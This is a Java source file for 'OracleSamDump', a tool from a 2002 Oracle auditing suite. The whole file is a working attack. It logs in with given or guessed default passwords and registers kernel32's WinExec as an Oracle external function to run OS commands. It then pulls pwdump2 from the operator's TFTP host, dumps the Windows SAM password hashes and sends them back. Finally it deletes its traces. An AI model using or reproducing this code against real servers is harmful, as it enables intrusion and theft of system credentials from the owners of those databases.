/* 
   Oracle Auditing Tools
   Copyright (C) Patrik Karlsson 2002
   
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

package ork;

import java.sql.*;
import java.util.*;
import oracle.jdbc.driver.*;
import gnu.getopt.*;

public class OracleSamDump {

    static Connection m_oConn = null;
    static boolean m_bDebug = false; /* should we be verbose or not */
    static String m_sTemp = null;

    private static String m_sVersion = OATVersion.getVersion();
    private static String m_sAuthor = OATVersion.getAuthor();
    
    /*
      wrapper for execute query
     */
    private static void exec(String sQuery) {

	try {
	    Statement oStmt = m_oConn.createStatement();
	    oStmt.executeQuery(sQuery);
	}
	catch ( SQLException e ) {
	    System.out.println("ERROR: " + sQuery);
	    //e.printStackTrace();
	}

    }

    private static void usage() {

	System.out.println("\tOracle Sam Dump " + m_sVersion + m_sAuthor );
	System.out.println("\t------------------------------------------");
	System.out.println("\tOracleSamDump [options]");
	System.out.println("\t\t-s*\t<servername>");
	System.out.println("\t\t-u\t<username>");
	System.out.println("\t\t-p\t<password>");
	System.out.println("\t\t-d\t<SID>");
	System.out.println("\t\t-P\t<portnr>");
	System.out.println("\t\t-l\t<localIP>");
	System.out.println("\t\t-T\t<temppath>");
	System.out.println("\t\t-v\tbe verbose");
	System.out.println("");

    }
    
    /*
      Clean up after us
    */
    private static void cleanup() {

	// drop some stuff !
	if ( m_bDebug )
	    System.out.println("INFO: Cleaning up sysexec lib and functions ...");

	execSysexecCmd("cmd /c del /f " +m_sTemp+ "\\pwdump2.exe");
	execSysexecCmd("cmd /c del /f " +m_sTemp+ "\\samdump.dll");
	execSysexecCmd("cmd /c del /f " +m_sTemp+ "\\sam.txt");
	exec("drop library oat_sysexec_lib");
	exec("drop function oat_sysexec_function");

    }

    /*
      Create the fun stuff
    */
    private static void createStuff() {

	if ( m_bDebug )
	    System.out.println("INFO: Creating sysexec lib and functions ...");

	exec("create library oat_sysexec_lib as '%windir%\\system32\\kernel32.dll';");
	exec("create function oat_sysexec_function ( lpCmdLine varchar2, nCmdShow varchar2 ) " +
	     "return int as external LANGUAGE C NAME \"WinExec\" LIBRARY oat_sysexec_lib;");
    }

    /*
      The wrapper for the extproc in Oracle
    */
    private static void execSysexecCmd(String sCMD) {
	
	if ( m_bDebug )
	    System.out.println("INFO: Executing haxxor cmd " + sCMD );

	try {
	    String sSQL = "{ ? = call oat_sysexec_function(?, ?) }";
	    CallableStatement oCStmt = m_oConn.prepareCall(sSQL);
	    oCStmt.registerOutParameter(1, OracleTypes.INTEGER);
	    oCStmt.setString(2, sCMD);
	    oCStmt.setString(3, "1");
	    oCStmt.execute();
	}
	catch( SQLException e ) {
	    /* 
	       A stupid RPC error seems to be generated all the time 
	    */
	    // System.out.println("ERROR: Random error, please ignore...");
	    // e.printStackTrace();
	}

    }

    /*
      Main function
    */
    public static void main (String args []) {

	String sHostName = null;
	String sDataBase = null;
	String sUserName = null;
	String sPassWord = null;
	String sLocalIP = null;

	int nOraclePort = 1521;
	Getopt oOpt = new Getopt("OracleSamDump", args, "s:d:u:p:hP:l:vT:");
	int c;
	String arg;
	SimpleServer oTFTPServer = null;
	OracleTNSSocket oTNSSock = null;
	String sConnectionURL = null;

	/* parse arguments */
	while ( ( c = oOpt.getopt() ) != -1 ) {

	    switch( c ) {

	    case 's':
		arg = oOpt.getOptarg();
		sHostName = arg;
		break;
		
	    case 'd':
		arg = oOpt.getOptarg();
		sDataBase = arg;
		break;

	    case 'u':
		arg = oOpt.getOptarg();
		sUserName = arg;
		break;

	    case 'T':
		arg = oOpt.getOptarg();
		m_sTemp = arg;
		break;
		
	    case 'p':
		arg = oOpt.getOptarg();
		sPassWord = arg;
		break;

	    case 'P':
		arg = oOpt.getOptarg();
		nOraclePort = Integer.parseInt(arg);
		break;
		
	    case 'l':
		arg = oOpt.getOptarg();
		sLocalIP = arg;
		break;

	    case 'h':
		usage();
		System.exit(1);
		break;

	    case 'v':
		m_bDebug = true;
		break;

	    default:
		usage();
		System.exit(0);
	    }

	}

	/* do we have all the parameters needed */
	if ( sHostName == null ) {
	    usage();
	    System.exit(0);
	}

	if ( m_sTemp == null ) {
	    m_sTemp = "%temp%";
	}
	else {
	    /* remove trailing backslashes */
	    while( m_sTemp.charAt(m_sTemp.length()-1) == '\\' ) {
		m_sTemp = m_sTemp.substring(0, m_sTemp.length() - 1);
	    }
	}

	/* Do some bragging */

	System.out.println("Oracle Sam Dump " + m_sVersion + " by " + m_sAuthor );
	System.out.println("------------------------------------------");

	/* Try to retrieve the database SID */
	if ( sDataBase == null ) {

	    oTNSSock = new OracleTNSSocket( sHostName, nOraclePort );

	    if ( !oTNSSock.connect() ) {
		System.err.println("ERROR: Could not connect to ORACLE server");
		System.exit(1);
	    }

	    Vector oVector = oTNSSock.getOracleSIDS();

	    if ( oVector != null && oVector.size() > 0 ) {
		sDataBase = (String) oVector.get(0);
	    }
	    else {
		System.err.println("ERROR: Enumerating ORACLE SIDS");
		System.exit(1);
	    }

	    /* did we manage to get a SID ?! */
	    if ( sDataBase == null ) {
		System.err.println("ERROR: Failed to fetch ORACLE SID");
		System.exit(1);
	    }
	    
	    if ( m_bDebug )
		System.out.println("DEBUG: SID " + sDataBase + " found");

	}

	/* 
	   do we have the local IP set ? 
	   If not try to figure it out
	*/
	if ( sLocalIP == null ) {

	    oTNSSock = new OracleTNSSocket( sHostName, nOraclePort );

	    if ( !oTNSSock.connect() ) {
		System.err.println("ERROR: Could not connect to ORACLE server");
		System.exit(1);
	    }

	    sLocalIP = oTNSSock.getLocalIP();
	    System.out.println("INFO: Local IP seems to be " + sLocalIP );
	    oTNSSock.close();
	}


	/* build a connection URL based on the input */
	sConnectionURL = "jdbc:oracle:thin:@" + sHostName + ":" + nOraclePort;
	sConnectionURL += ":" + sDataBase;

	/* Start our TFTP server */
	oTFTPServer = new SimpleServer();

	/*
	  Lets try to load the Oracle JDBC driver
	*/
	try {
	    Class.forName("oracle.jdbc.driver.OracleDriver");
	}
	catch( ClassNotFoundException e ) {
	    System.err.println("ERROR: Could not load JDBC driver. Make sure it's in the classpath");
	    System.exit(1);
	}

	if ( sUserName != null && sPassWord != null ) {

	    /*
	      Ok so the Driver loaded, let's try to login
	    */
	    try {
		m_oConn = DriverManager.getConnection (sConnectionURL,sUserName, sPassWord);
	    }
	    catch ( SQLException e ) {
		//e.printStackTrace();
		System.out.println("ERROR: Could not connect to ORACLE server.");
		System.exit(0);
	    }

	}
	else {
	    /* 
	       Try to get an account with sufficent privileges to exploit 
	    */                                         
	    boolean bCheckPerm = true;
	    boolean bReturnFirst = true;
	    m_oConn = OraclePwGuess.checkDefaultPasswords(sConnectionURL, bCheckPerm, bReturnFirst);
	}

	if ( m_oConn == null ) {
	    System.out.println("ERROR: Failed to connect to server");
	    System.exit(1);
	}

	createStuff();

	System.out.println("INFO: Uploading PWDUMP2 to Oracle Server");
	execSysexecCmd("cmd /c tftp -i " +sLocalIP+ " get windows/pwdump/pwdump2.exe " +m_sTemp+ "\\pwdump2.exe");
	execSysexecCmd("cmd /c tftp -i " +sLocalIP+ " get windows/pwdump/samdump.dll " +m_sTemp+ "\\samdump.dll");

	System.out.println("INFO: Dumping the SAM on Oracle Server");
	execSysexecCmd("cmd /c " +m_sTemp+ "\\pwdump2.exe > " +m_sTemp+ "\\sam.txt");

	System.out.println("INFO: Fetching sam.txt");
	execSysexecCmd("cmd /c tftp " +sLocalIP+ " put " +m_sTemp+ "\\sam.txt windows/sam/sam-" +sHostName+ ".txt");
	
	System.out.println("INFO: If all went well, the server SAM file should be in tftproot/sam");

	System.out.println("INFO: Cleaning up !");
	cleanup();

	System.out.println("INFO: Stopping TFTP Server");
	oTFTPServer.stopServer();

    }
	
}
